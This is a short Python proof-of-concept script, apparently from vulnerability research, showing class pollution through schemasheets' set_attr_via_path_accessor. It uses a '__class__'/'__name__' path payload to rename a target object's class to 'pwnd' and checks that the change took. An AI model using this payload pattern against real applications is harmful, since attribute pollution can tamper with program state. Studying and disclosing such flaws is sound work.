# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: set_attr_via_path_accessor
# Type: get-both-set-both

from schemasheets.schemamaker import set_attr_via_path_accessor

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = ["__class__", "__name__"]

def run_poc():
  set_attr_via_path_accessor(target, PAYLOAD, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
